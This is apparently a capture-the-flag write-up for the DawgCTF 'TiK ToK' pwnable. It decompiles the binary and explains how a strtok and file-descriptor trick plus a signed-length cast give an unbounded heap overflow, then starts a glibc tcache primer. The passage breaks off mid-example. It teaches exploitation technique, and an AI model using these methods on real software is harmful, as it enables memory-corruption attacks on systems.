# TiK ToK (pwn)

At 500 points, this was the hardest pwnable challenge in DawgCTF. And boy, with only 3 solves at the end, did it deserve every single point! This is definitely the best pwnable I've had the pleasure to solve, and it will likely not be topped by another challenge for a very long time. 

Note: As much as I want to say I did this, I did need some nudges on this challenge from the challenge author, mainly on the later part of this challenge. Usually these problems don't make it into a writeup, but this challenge's way too good to be skipped. (and my final solution diverges quite a bit from theirs, so there!)

Without further ado...

## Problem Statement:

![Problem statement](https://i.imgur.com/MIKzokM.png)

## Initial Analysis/Recon:
As always, with every binary exploitation problem, we begin by taking a look at the protections enabled on the binary:

![](https://i.imgur.com/UotVJQL.png)

Note: On debian machines, running checksec reveals that this binary is compiled with partial RELRO instead of full RELRO. IDA also thought that the executable was compiled with partial RELRO. However, this binary does have full relro compiled, so beware!

Unlike usual challenge writeups, we'll first begin looking on how the remote service works, by connecting to it through netcat: 

![](https://i.imgur.com/rLyfFuB.png)

At first glance this looks like the typical menu-based heap challenge (or is it). We have the ability to import songs, view the playlist, play the song, and remove the song.

When we choose to import a song, we get the following: 

![](https://i.imgur.com/Yvhx2Ys.png)

![](https://i.imgur.com/hL9PM3n.png)

Looks like we're able to view part of the remote filesystem! We can see that the flag.txt file is in the current working directory, and we have a lot of text files that are inside directories. At the end, it asks us to import a song, by specifying the entire filepath. However when we entered the filepath, we got an bad filepath error.

This indicates the possibility that we're not currently at the root filesystem. When we specified `Warrior/cmon.txt` instead of `/Warrior/cmon.txt`, our imports were successful:

![](https://i.imgur.com/WEtca1V.png)

When we choose the option to view the playlist, after importing the song, we got the following:

![](https://i.imgur.com/96gHqGl.png)

Seems like our song is assigned an ID of 1! If we choose to import more songs, we'll see that the ID's they get assigned to counts up, one at a time.

When we choose the option to play the song in our playlist, we got the following:

![](https://i.imgur.com/0fWTBNM.png)

Knowing what we know so far, we can guess that since we imported a text file on the remote filesystem, this probably prints out the contents of that file. 

Finally, when we choose the option to remove the song in our playlist, we get the following:

![](https://i.imgur.com/1Jfl8Z4.png)

Not too exciting. However, this allows us to begin checking for any possible heap-related bugs. First: Can we list out a removed song?

![](https://i.imgur.com/rInEXCd.png)

Nope, so no use after free there. Next: Can we play a removed song?

![](https://i.imgur.com/Fi4N3NC.png)

Nope, so no use after free there. Finally: Can we remove an already removed song?

![](https://i.imgur.com/pj3Aftm.png)

Nope, so no double free vulnerability there. Seems like we're out of luck with blackbox analysis, time to break out the disassemblers/decompilers!

## Disassembly/Decompiler Analysis:

This...is going to be a journey.

Below is the code for the main method: (using IDA for the analysis)

![](https://i.imgur.com/WdKEavv.png)

Looks simple, but it's pretty obvious from the function names that `play_music()` is where all of the action is at. Let's look at that next:

```cpp=
void play_music()
{
  int v0; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  while ( 1 )
  {
    v0 = 0;
    puts("\nSo what would you like to do today?");
    puts("1. Import a Song to the Playlist");
    puts("2. Show Playlist");
    puts("3. Play a song from the Playlist");
    puts("4. Remove a song from the Playlist");
    puts("5. Exit");
    printf("Choice: ");
    __isoc99_scanf("%d", &v0);
    while ( getchar() != 10 )
      ;
    putchar(10);
    switch ( v0 )
    {
      case 1:
        if ( song_count <= 49 )
        {
          import_song();
          ++song_count;
        }
        else
        {
          puts("Error: Unable to Import Song, Library Full");
        }
        continue;
      case 2:
        if ( song_count <= 0 )
          goto LABEL_16;
        list_playlist();
        break;
      case 3:
        if ( song_count <= 0 )
          goto LABEL_16;
        play_song();
        break;
      case 4:
        if ( song_count <= 0 )
LABEL_16:
          puts("Playlist is empty");
        else
          remove_song();
        break;
      case 5:
        puts("We're sad to see you go!");
        exit(0);
        return;
      default:
        continue;
    }
  }
}
```

So this is where the menu selections happen. When we execute this function, we'll enter an infinite while loop, where the menu is printed out. The program then reads in an integer from standard input, and goes to the appropriate case statement based on the input, and executes a specific function. From this decompilation, we can see that importing a song will call `import_song()`, showing the playlist will call `list_playlist()`, playing a song will call `play_song()`, and removing a song from the playlist will call `remove_song()`.

We also see the presence of a `song_count` global variable. We can assume it starts at 0, and see that it increments once for each song import. We also see that there's a check to make sure that `song_count` is less than 50, so this means that we can have at max 50 songs in the library. Finally, we notice that removing a song doesn't decrement `song_count`, so unless it's decremented internally, we are limited to the total number of times we can import a song.

Let's first look at the beginning of the `import_song()` function:

```cpp=
unsigned __int64 import_song()
{
  int v0; // ebx
  int v1; // ebx
  int v2; // ebx
  int v4; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  list_options();
  ...
```

Looks like it calls another function, `list_options()`:
```clike
unsigned __int64 list_options()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  system("ls -R");
  puts("\nWhich song would you like to import?");
  puts("Please provide the entire file path.");
  return __readfsqword(0x28u) ^ v1;
}
```
So this explains how we get to view the song library: the program executes `ls -R` to print out the files in the current directory recursively.

At this point we may get excited, as the presence of the `system()` in code is usually something we can use. However, we'll ignore it for now, especially since full RELRO is enabled.

Let's keep decompiling the `import_song()` function:

```cpp=
  ...
  v4 = read(0, (char *)&songs + 56 * song_count, 0x18uLL);
  if ( v4 <= 0 )
  {
    puts("Error reading input, exiting");
    exit(-1);
  }
  if ( *((_BYTE *)&songs + 56 * song_count + v4 - 1) == 10 )
    *((_BYTE *)&songs + 56 * song_count + v4 - 1) = 0;
  v0 = song_count;
  *((_DWORD *)&fd_offset + 14 * v0) = open((const char *)&songs + 56 * song_count, 0);
  if ( *((_DWORD *)&fd_offset + 14 * song_count) == -1
    || *((char *)&songs + 56 * song_count) <= 64
    || *((char *)&songs + 56 * song_count) > 90
    || strstr((const char *)&songs + 56 * song_count, "flag")
    || strstr((const char *)&songs + 56 * song_count, "..") )
  {
    puts("Error: Bad filepath, exiting");
    exit(-1);
  }
  v1 = song_count;
  *((_QWORD *)&authorptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/");
  v2 = song_count;
  *((_QWORD *)&songtitleptr + 7 * v2) = strtok(0LL, ".");
  return __readfsqword(0x28u) ^ v5;
}
```
We can see that the program will read in 0x18 bytes from stdin to the location specified by `(char *)&songs + 56 * song_count`, where `songs = 0x404060`, and exits if the read() return value is less than 1. The program then nulls out the newline character at the end, and then performs the following checks on the input:
* If attempting to open the file specified with the input is valid (return value not equal to -1)
    * The file descriptor is stored at `(_DWORD *)&fd_offset + 14 * v0`, with `fd_offset = 0x404078`
* If the first character of the input is greater than 64 (`@`) and less than 91 (`[`), basically if the first character is a capital letter.
* If the substrings flag and .. don't exist in the input.

If any of these checks fail, the program will exit. Otherwise, it will call strtok two times to seperate out the directory and the text file file name (before the .txt extension) as seperate pointers, and store them in `(_QWORD *)&authorptr + 7 * v1)` and `(_QWORD *)&songtitleptr + 7 * v2)`, respectively, with `authorptr = 0x404080`, and `songtitleptr = 0x404088`.

By looking at the decompilation, we can deduce that imported songs are stored in an array of some structure, where the array indexing occurs by modifying the `song_count` variable from earlier. As far as how the shape of the struct goes, so far we can conclude that it will look something like this:

```cpp=
struct song {
    char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
    char * songptr; //?
    //maybe something more below?
};

struct songs[50]; //where the songs are stored, aka. in the .bss
```

Cool right? We already figured out the layout of how songs are stored in memory, and that they're stored at an static address (in the .bss memory region). This will be very useful to us during exploitation, so we'll be frequently mentioning the `song` struct through the rest of this writeup

Let's take a look at `list_playlist()`:

```clike=
unsigned __int64 list_playlist()
{
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  for ( i = 0; i < song_count; ++i )
  {
    if ( *((_QWORD *)&authorptr + 7 * i) )
      printf(
        "%d. %s-%s\n",
        (unsigned int)(i + 1),
        *((const char **)&authorptr + 7 * i),
        *((const char **)&songtitleptr + 7 * i));
  }
  return __readfsqword(0x28u) ^ v2;
}
```
Looks like a fairly simple function! It's just a for loop that loops through each song from index 0 to `song_count - 1`, and if `song->authorptr (see struct diagram above)` isn't 0x0, it will print out the author and the song, along with a song ID.

Let's look at `play_song()` next:
```clike=
unsigned __int64 play_song()
{
  int v0; // ebx
  int v2; // [rsp+4h] [rbp-2Ch]
  unsigned int i; // [rsp+8h] [rbp-28h]
  char nbytes[11]; // [rsp+Ch] [rbp-24h]
  char v5; // [rsp+17h] [rbp-19h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  v2 = 0;
  *(_DWORD *)&nbytes[7] = 0;
  v5 = 0;
  *(_DWORD *)nbytes = 0;
  puts("Which song would you like to play?");
  list_playlist();
  printf("Choice: ");
  __isoc99_scanf("%d", &v2);
  while ( getchar() != 10 )
    ;
  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&authorptr + 7 * v2) )
  {
    printf(
      "You Selected: %s from %s\n",
      *((const char **)&songtitleptr + 7 * v2),
      *((const char **)&authorptr + 7 * v2));
    if ( !*((_QWORD *)&song_content_ptr + 7 * v2) )
    {
      for ( i = 0; i <= 4; ++i )
      {
        read(*((_DWORD *)&fd_offset + 14 * v2), &nbytes[i + 7], 1uLL);
        if ( nbytes[i + 7] == 10 )
        {
          nbytes[i + 7] = 0;
          break;
        }
      }
      *(_DWORD *)nbytes = atoi(&nbytes[7]);
      v0 = v2;
      *((_QWORD *)&song_content_ptr + 7 * v0) = malloc((unsigned int)(*(_DWORD *)nbytes + 1));
      memset(*((void **)&song_content_ptr + 7 * v2), 0, (unsigned int)(*(_DWORD *)nbytes + 1));
      read(*((_DWORD *)&fd_offset + 14 * v2), *((void **)&song_content_ptr + 7 * v2), *(unsigned int *)nbytes);
    }
    printf("%s", *((const char **)&song_content_ptr + 7 * v2));
  }
  else
  {
    printf("Error: Invalid Song Selection");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

This function's pretty complicated, so let's break it down. We'll first begin by analyzing this section:

```clike=
  int v0; // ebx
  int v2; // [rsp+4h] [rbp-2Ch]
  unsigned int i; // [rsp+8h] [rbp-28h]
  char nbytes[11]; // [rsp+Ch] [rbp-24h]
  char v5; // [rsp+17h] [rbp-19h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  v2 = 0;
  *(_DWORD *)&nbytes[7] = 0;
  v5 = 0;
  *(_DWORD *)nbytes = 0;
  puts("Which song would you like to play?");
  list_playlist();
  printf("Choice: ");
  __isoc99_scanf("%d", &v2);
  while ( getchar() != 10 )
    ;
```

This section of the code sets a 7 byte region around `nbytes` in the stack to 0, calls `list_playlist()`, and reads in a number to v2.

```clike=
  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&authorptr + 7 * v2) )
  {
    ...
    ...
  }
  else
  {
    printf("Error: Invalid Song Selection");
  }
  return __readfsqword(0x28u) ^ v6;
```

This section of the code (excluding the contents inside the if statement) checks if our selection's greater than or equal to 0, less than `song_count`, and if the respective `song->authorptr` that corresponds with our selection is not null. If either of these checks fail, the function returns immediately.

Now, let's look at what happens if all these checks succeed:

```clike=
    printf(
      "You Selected: %s from %s\n",
      *((const char **)&songtitleptr + 7 * v2),
      *((const char **)&authorptr + 7 * v2));
    if ( !*((_QWORD *)&song_content_ptr + 7 * v2) )
    {
      for ( i = 0; i <= 4; ++i )
      {
        read(*((_DWORD *)&fd_offset + 14 * v2), &nbytes[i + 7], 1uLL);
        if ( nbytes[i + 7] == 10 )
        {
          nbytes[i + 7] = 0;
          break;
        }
      }
      *(_DWORD *)nbytes = atoi(&nbytes[7]);
      v0 = v2;
      *((_QWORD *)&song_content_ptr + 7 * v0) = malloc((unsigned int)(*(_DWORD *)nbytes + 1));
      memset(*((void **)&song_content_ptr + 7 * v2), 0, (unsigned int)(*(_DWORD *)nbytes + 1));
      read(*((_DWORD *)&fd_offset + 14 * v2), *((void **)&song_content_ptr + 7 * v2), *(unsigned int *)nbytes);
    }
    printf("%s", *((const char **)&song_content_ptr + 7 * v2));
```

The program's going to print out the song name and author of the song we selected, and does a check on `(_QWORD *)&song_content_ptr + 7 * v2`, where `song_content_ptr=0x404090`, to see if that is null. If it is null, the program will read in 5 bytes from `song->filedesc` into the `nbytes` character array in the stack. The program will then convert the `nbytes` array into an unsigned integer and store the result in itself. Then, the program will allocate (using malloc)`nbytes + 1` bytes of memory to `(_QWORD *)&song_content_ptr + 7 * v2`, memsets `nbytes + 1` bytes of that buffer to 0x0, and reads in `nbytes` bytes from `song->filedesc` into `(_QWORD *)&song_content_ptr + 7 * v2`. The program then exits the if statement, and print out the contents of `(_QWORD *)&song_content_ptr + 7 * v2`.

This tells us a lot of things. First, our initial guess of the `song` struct layout was incorrect, as the `song_content_ptr` is part of the layout. Our new `song` struct layout is the following:

```cpp=
struct song {
    char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
    char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
    char * songcontentptr;
}; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size

struct songs[50]; //where the songs are stored, aka. in the .bss
```

Second, we now know that playing a song will start allocating stuff on the heap! We do need to take note that the allocation only happens when the song is played for the first time, otherwise it just print out what's stored in `song->songcontentptr`

Third, this gives a big clue on how the text files are formatted on the remote server. We can guess that the first line of each text file specifies the length of the song lyrics, and the rest of the lines contain the lyrics.

However, [trashcanna](https://twitter.com/annatea16), the challenge author, was nice enough to provide us with the songs.zip file, which contains the song text files that are used on the remote server. Looking at one of them confirms our guess:

![](https://i.imgur.com/P1n6TjR.png)

So that's why the program reads in stuff to `nbytes`, and make an allocation of `nbytes+1` bytes. The `+1` at the end ensures that the song lyrics stored on the heap is null-terminated, as we can only read `nbytes` bytes.

Last but not least, let's look at the `remove_song()` function: 

```clike=
unsigned __int64 remove_song()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Which song would you like to remove?");
  list_playlist();
  printf("Choice: ");
  __isoc99_scanf("%d", &v1);
  while ( getchar() != 10 )
    ;
  if ( --v1 >= 0 && v1 < song_count && *((_QWORD *)&authorptr + 7 * v1) )
  {
    printf("Removing: %s from %s\n", *((const char **)&songtitleptr + 7 * v1), *((const char **)&authorptr + 7 * v1));
    *((_QWORD *)&songtitleptr + 7 * v1) = 0LL;
    *((_QWORD *)&authorptr + 7 * v1) = 0LL;
    free(*((void **)&song_content_ptr + 7 * v1));
    *((_QWORD *)&song_content_ptr + 7 * v1) = 0LL;
    memset((char *)&songs + 56 * v1, 0, 0x18uLL);
    close(*((_DWORD *)&fd_offset + 14 * v1));
    *((_DWORD *)&fd_offset + 14 * v1) = 0;
  }
  else
  {
    printf("Error: Invalid Song Selection");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

The beginning parts look similar to the `play_song()` function, where the program prints the playlist, reads a number, and does some checks to determine whether the `song->authorptr` pointer is not null. If it is not null, it's going to null out the the corresponding `song->songptr` and `song->songauthor` pointers, deallocates (by calling free()) and null out the `song->songcontentptr` pointer, memsetting all 0x18 bytes of `song->filename` character array, closes the `song->filedesc` file descriptor, and nulls it out as well.

## Tiktok to the strtok

![](https://i.imgur.com/aaVNhc9.png)

(Not the best meme for this writeup, I know...it's not easy to find memes about strtok. I promise the memes later on are better though! Anyways here's the source: https://www.reddit.com/r/ProgrammerHumor/comments/fvywzo/php_clearly_has_the_most_intuitive_name/)

What do we do now? At first glance, it seems like everything's valid. Heap pointers are properly nulled out upon freeing them, preventing use after free and double free attacks, and no memory is being read out of bounds, preventing heap overflows. Indexes are checked properly, which prevents out of bounds attacks, and nothing that's echoed back can be abused in the form of a format string. As far as I could tell, everything in the heap rules list by [Azeria](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) is followed correctly.

After struggling for a bit, we wondered how nice it would be if we can actually write our own stuff to the heap. After all, the only things where we can write our own stuff to  are stack variables (such as `nbytes` in `play_song()`), and stuff in the .bss, which, given the binary, doesn't have a lot of write content control. The only function that messes with the heap is `play_song()`, and in that function, the `read()` call reads in stuff from `song->filedesc`, which was set when the song was imported at `import_song()`. We know that the file descriptor that matches stdin is file descriptor number 0, so if we were to somehow overwrite `song->filedesc` with 0, we should be able to play that song to enter our own stuff in the heap.

How can we overwrite `song->filedesc`? The closest we can overwrite `song->filedesc` is when we read in the 0x18 bytes into `song->filename` memory region, but since `song->filename` itself is 0x18 bytes in size, that doesn't seem like it'll be able to do anything. Plus, don't forget we still have to make sure that `song->filename` can bypass these checks in `import_song()`!

* If attempting to open the file specified with the input is valid (return value not equal to -1)
* If the first character of the input is greater than 64 (`@`) and less than 91 (`[`), basically if the first character is a capital letter.
* If the substrings flag and .. don't exist in the input.

Last two checks should be fairly easy to bypass (they're just there to make sure we can't just directly load the flag), but the first check's going to be tricky, as it limits us on what filenames we can use (e.g. the filename must correspont to an existing file). And of course, none of the song directory+name combos are 0x18 bytes in length...

Let's try some stuff. We know we can open files no problem. However, can we open directories? That should be fairly easy to test - we can write a c program to open the Warrior directory, and print out the return value:

![](https://i.imgur.com/zUpoIMm.png)

Looks like we can! Now, let's see if we can specify more slashes. In most libraries, if you add extra forward slashes after a directory name, the library's just going to ignore them and open up the directory. Let's see if that's the case here, just adding 5 slashes after Warrior:

![](https://i.imgur.com/7Xr9dqR.png)

Looks like it's still valid! That's so cool! This means we can send an arbitrary number of forwardslashes after the directory name, and the binary will still happily open the directory. This will make us be able to fill up all 0x18 bytes of the `song->filename` buffer.

(By the way, what happens when we try to play a song that's imported from a directory? Well, the tiktok app will attempt to read values from the directory, but since the directory isn't a 'file' that can be read, that read() call will probably not be able to read anything. Thus, `nbytes` is 0, so the program will call `malloc(1)` to allocate 1 byte of memory, memset that 1 byte to 0, and read in 0 bytes. Keep this fact in mind, it'll be important later.)

This still doesn't help us though, as the file descriptor is located at offset 0x19 of the `song->filename` buffer. However, since input is read in by using the `read()` function, instead of `fgets()`, our input doesn't get null-terminated. Recall in C, c-strings are always terminated with a null byte. Since `read()` doesn't null-terminate our input, we do have the ability to make the 0x18th byte non-null. if we were to treat `song->filename` as a string, it will include `song->filedesc` in it, as there's no null byte terminator in between.

Maybe this will help us. Let's look again to see what happens next, in `import_song()`:

```clike=
  v1 = song_count;
  *((_QWORD *)&authorptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/"); //recall songs is the offset to song->filename
  v2 = song_count;
  *((_QWORD *)&songtitleptr + 7 * v2) = strtok(0LL, ".");
  return __readfsqword(0x28u) ^ v5;
```

What does strtok do? From its man page:

![](https://i.imgur.com/dKTxmQh.png)

Basically, it splits strings up according to what's specified in the delimiter, returns the first part as a pointer (or NULL if the delimiter isn't found), and zeroes out the delimiter. If you call strtok again with a null pointer in the str argument, but with a different delimiter, it will do the strtok operation on the same string that's specified in the first call, find and zero out the next delimiter, and returns a pointer to one byte after the first delimiter.

Let's visualize this in context of the code. Suppose we pass it a 'valid' filepath, e.g. `Warrior/only.txt`. The first strtok call, looks like this:

```clike=
strtok("Warrior/only.txt", "/"); //yes I know you can't call strtok on a hardcoded string, this is just a demonstration.
```

After `strtok()` returns, we get this:

```
              Scanner pointer
              v
[Warrior[\x00]only.txt][song->filedesc][song->authorptr]
 ^                                      |
 returned pointer (song->authorptr)------

Where [\x00] represents a null byte.
```

Now, let's call `strtok()` a second time:
```clike=
strtok(0, ".");
```

Since we're passing a null pointer as the first argument, `strtok()` will operate on the same string as the previous `strtok()` call. After the second `strtok()` returns, we get this:

```
                         Scanner pointer
                         v
[Warrior[\x00]only[\x00]txt][song->filedesc][song->authorptr][song->songptr]
 ^            ^                               |               |
 |            returned pointer (song->songptr)-----------------
 ---------------------------------------------|
```

Now, this assumes that our filename is 'valid'. However, we know that we can bypass the checks with a directory name, with a bunch of forward slashes. What if we use `Warrior/////` instead? 

(For illustration purposes, I'm only using 5 slashes in this diagram instead of `0x18 - len("Warrior")`, but assume for the purpose of this diagram that that's enough to fill the `song->songname` buffer right up to `song->filedesc`)

After the first `strtok()` call:

```
              Scanner pointer
              v
[Warrior[\x00]////][song->filedesc][song->authorptr]
 ^                                  |
 returned pointer (song->authorptr)--
```

Now, what happens if we do the second strtok call? Recall it's looking for the "." delimiter

```
                                         Scanner pointer (somewhere in here since there's null bytes in 64 bit addresses)
                                         v
[Warrior[\x00]////][song->filedesc][song->authorptr][song->songptr = NULL]
 ^                                  |
 returned pointer (song->authorptr)--
```

Hmmm....since there's no more '.' characters in the string, `strtok()` is likely going to return null. However, what if we're able to get `open()` to return the integer value of the '.' character as the file descriptor, which is 46?

```
                                             Scanner pointer
                                             v
[Warrior[\x00]////][song->filedesc = [\x00]][song->authorptr][song->songptr]
 ^            ^                     |                         |
 |            returned pointer -----|-------------------------|
 ------------------------------------
```

Now that we introduced the delimiter, '.' as part of our 'string' (even though it's in `song->filedesc`), strtok is going to set the delimiter to 0. But since the file descriptor of 0 is the standard input file descriptor, this is exactly what we need!

How do we get `open()` to give us a file descriptor of 46? Let's first review how file descriptor 'allocations' in a process works: (putting allocations in quotes, as opening/closing file descriptors doesn't touch the heap)

When a process starts, it opens up 3 file descriptors with the values 0, 1, and 2, where 0 is the file descriptor for standard input, 1 is the file descriptor for standard output, and 2 is the file descriptor for standard error output. If we want to open up more file descriptors, such as opening a file or a network socket, it will count up from there. So, the next file will have a file descriptor of 3, the next one is 4, and so on. We can see this in action through this test program: 

![](https://i.imgur.com/WTJb4v5.png)

If we close a file descriptor in the middle, say the one in variable `b`, what happens if we try to open another file descriptor? 

![](https://i.imgur.com/ohC6Zcb.png)

We see that the new file descriptor will take the place of b, which was 4. In general, as per unix standard, file descriptor 'allocation' works by allocating from the lowest unopened file descriptor possible, and work up from there.

Now that we know how file descriptor 'allocations' work, let's see how we can get `open()` to return a file descriptor of 46. If we import our first song, based on how file descriptor 'allocations' work, we know that it will return us a file descriptor of 3. When we import our next song, it should return us a file descriptor of 4. Third song returns 5, fourth song returns 6, and so on. Looking at this, we can deduce that after we import 43 songs, if we import another song, that song should give us a file descriptor of 46! Success!

To recap, our plan of attack is as follows:
* Import 43 songs with various filepath
    * The specific filepath doesn't matter....yet
* When we import our 44th song, specify `Warrior + "/"*(0x18 - len("Warrior"))` as the filepath. This should allocate the 46th file descriptor for `song->filedesc`, which will get zeroed out by the second `strtok()` call. 

As always, we should check to see if our theory works. Let's run the binary locally, import 43 songs, and do the attack on song number 44 (using a bit of pwntools python magic). What happens if we play song number 44?

![](https://i.imgur.com/RPk0mlu.png)

We see that we are indeed able to specify our own song contents to the heap! Note that we already know how songs are formatted (length of song at the top, and contents after a newline).

## Overflows of different types and places

![](https://i.imgur.com/Jw27eju.png)
 (Source: https://www.reddit.com/r/ProgrammerHumor/comments/8o09av/uint_64_balance/)

So what does this get us? Let's take another look at this snippet in the `play_song()` function:

```clike=
      *(_DWORD *)nbytes = atoi(&nbytes[7]);
      v0 = v2;
      *((_QWORD *)&song_content_ptr + 7 * v0) = malloc((unsigned int)(*(_DWORD *)nbytes + 1));
      memset(*((void **)&song_content_ptr + 7 * v2), 0, (unsigned int)(*(_DWORD *)nbytes + 1));
      read(*((_DWORD *)&fd_offset + 14 * v2), *((void **)&song_content_ptr + 7 * v2), *(unsigned int *)nbytes);
```

We see that no matter what number we specify for `nbytes`, the `malloc()`'d region is always one greater than the number of bytes we're able to read. However, if we take a closer look, we notice the following:
* nbytes is stored as a signed integer
* When the program calls malloc, memset, and read, the length parameter (which is `nbytes + 1` and `nbytes` respectively) is casted as an unsigned integer

So, what if we pass in -1 into `nbytes`? The program will call `malloc()` to allocate a 0 byte region (-1 + 1 = 0), memset a 0 byte region, and read in -1 bytes. However, since the read length parameter is casted to an unsigned integer, -1 will cast into UNSIGNED_MAX_INT, or 4,294,967,295!! This will enable us to read in much much more input than what is allocated. And yes, calling `malloc(0)` will actually allocate some memory (we'll see more of this later). Let's test this out:

![](https://i.imgur.com/0aBThhp.png)

Yay, we are now able to do an almost unbounded overflow on the heap! This is a very powerful exploit primitive that should be able to take us all the way to a shell!

## Tcache primer

(If you're already familiar with how the tcache allocator works, as well as how to use the pwndbg gdb extension to visualize the heap, feel free to skip this section and go to the next section, named "Laying our the heap overflow". Otherwise, you're going to need to read this to understand the rest of this writeup.)

It is pretty clear at this point that we'll need to do some heap exploitation to get our shell. However, before we try to attack the heap, we first need to understand how the GLIBC2.27 heap works (That's the version of the libc-2.27.so library that was given to us)

When we call malloc onto a program, it will allocate a chunk of memory from the heap, and return a pointer to the beginner of a chunk. However, how are the chunks formatted?

This is how each allocated chunk is stored in memory (taken from [malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk)):

```clike=
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

Now, not all of these fields are used. With small (< 1032 byte) allocations, only the `mchunk_size` value is used for allocated chunks. So, when chunks are allocated, it will look something like this (also taken from the source):

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
```

Interestingly, we see that the size of a chunk has three bits: The A, M, and P. The A bit (which is the third least significant bit) is set if this chunk is allocated in other arenas for multithreaded applications (Since this app is not multithreaded, for the purposes of this writeup, it's always safe to assume that this bit is never set.)

The M bit (the second least significant bit) is set if this chunk comes from mmap'd memory, which happens when the heap runs out of space. Since we're likely not going to need that much memory, for this writeup it's safe to assume that this bit is also never set.

Finally, the P bit (the least significant bit) is set if the previous bit is in use, or part of an allocated chunk. When the previous adjacent chunk gets freed, this bit gets set to 0. This will be important to take into account: If `mchunk_size` in memory is odd, this bit is set, and if `mchunk_size` in memory is even, this bit is not set.

Now, let's look at what a chunk looks like when it's freed. When a chunk is freed, it will populate more values in the `malloc_chunk` structure. When small allocations are freed in the tcache allocator, however, it only populates the `fd` pointer, which points to the address of the next free chunk. This places the chunk into a bin, which is basically a linked list of freed chunks (where they're linked by the `fd` pointer. Since we're using the tcache allocator, the freed chunk (if the allocation is small) goes into a tcache bin. Something like this (again, taken from the source, though modified to depict a tcache bin):

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |  Forward pointer to next chunk in list (0 if it's the first)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |     Back pointer to previous chunk in list (0 for tcache)     |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

(BTW this is why even if you call `malloc(0)` bytes, memory will still be allocated, to make room for size headers and freed chunk pointers when the chunk is freed)

(Also, technically instead of the `fd` pointer, it's actually a `next` pointer to the next `tcache_entry` struct. However, since a `tcache_entry` struct is synonymous with a freed chunk, this semantic difference can be ignored.)

Let's see this in action! We will be using a gdb extension called pwndbg (https://github.com/pwndbg/pwndbg), as it makes visualizing the heap memory and headers much much easier.

Let's first use gdb against this program:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>

char * first = "AAAABBBB";
char * second = "CCCCDDDD";
char * third = "EEEEFFFF";


int main() {
